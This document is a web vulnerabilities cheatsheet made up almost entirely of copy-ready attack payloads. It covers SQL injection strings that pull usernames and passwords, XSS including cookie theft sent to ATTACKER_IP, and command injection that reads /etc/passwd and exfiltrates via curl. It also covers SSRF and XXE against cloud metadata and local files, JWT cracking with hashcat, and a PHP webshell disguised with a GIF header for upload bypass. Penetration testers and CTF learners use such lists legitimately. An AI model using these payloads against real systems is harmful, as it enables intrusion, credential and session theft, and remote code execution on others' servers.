# Web Vulnerabilities Cheatsheet

## SQL Injection

### Detection
```
'
''
`
')
"))
1=1
1=2
1' OR '1'='1
admin'--
admin' #
```

### UNION-Based
```sql
' ORDER BY 1--
' ORDER BY 2--    # increment until error → number of columns
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT NULL,version(),NULL--
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT NULL,username||':'||password,NULL FROM users--
```

### Blind Boolean
```sql
' AND 1=1--    # true
' AND 1=2--    # false
' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE username='admin')='a'--
```

### Time-Based Blind
```sql
'; SELECT SLEEP(5)--              # MySQL
'; WAITFOR DELAY '0:0:5'--        # MSSQL
'; SELECT pg_sleep(5)--           # PostgreSQL
```

---

## XSS Payloads

### Basic
```html
<script>alert(1)</script>
<script>alert(document.cookie)</script>
```

### Filter Bypass
```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<details open ontoggle=alert(1)>
javascript:alert(1)
```

### Cookie Theft
```html
<script>fetch('http://ATTACKER_IP/?c='+btoa(document.cookie))</script>
<script>new Image().src='http://ATTACKER_IP/?c='+document.cookie</script>
```

---

## Command Injection

```bash
; id
| id
|| id
& id
&& id
`id`
$(id)
; cat /etc/passwd
| cat /etc/passwd

# Blind
; ping -c 1 ATTACKER_IP
; curl http://ATTACKER_IP/$(whoami)
```

---

## Path Traversal

```
../etc/passwd
../../etc/passwd
../../../etc/passwd
....//....//....//etc/passwd
%2e%2e%2fetc%2fpasswd
%252e%252e%252fetc%252fpasswd
..%2f..%2f..%2fetc%2fpasswd
```

## SSRF

```
http://localhost/
http://127.0.0.1/
http://0.0.0.0/
http://[::]
http://169.254.169.254/latest/meta-data/   # AWS metadata
http://metadata.google.internal/computeMetadata/v1/  # GCP metadata
file:///etc/passwd
```

## XXE (XML External Entity)

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>

<!-- SSRF via XXE -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
```

## IDOR

```
GET /api/user/1001  → try /api/user/1002, /api/user/1
GET /download?file=invoice_1001.pdf  → try invoice_1002.pdf
GET /admin/user?id=5  → try id=1 (admin account)
```

## JWT Attacks

```bash
# Decode
echo "eyJ..." | base64 -d

# Algorithm None attack — change alg to "none", remove signature
# Weak HS256 — crack with hashcat
hashcat -a 0 -m 16500 token.jwt /usr/share/wordlists/rockyou.txt
```

## File Upload Bypass

```
# Change extension
shell.php → shell.php5, shell.phtml, shell.pHp, shell.php.jpg

# Magic bytes — add GIF header to PHP webshell
GIF89a;
<?php system($_GET['cmd']); ?>

# Content-Type — change to image/jpeg in Burp while keeping .php extension
```

## Open Redirect

```
https://target.com/redirect?url=http://evil.com
https://target.com/redirect?url=//evil.com
https://target.com/redirect?url=https:evil.com
```
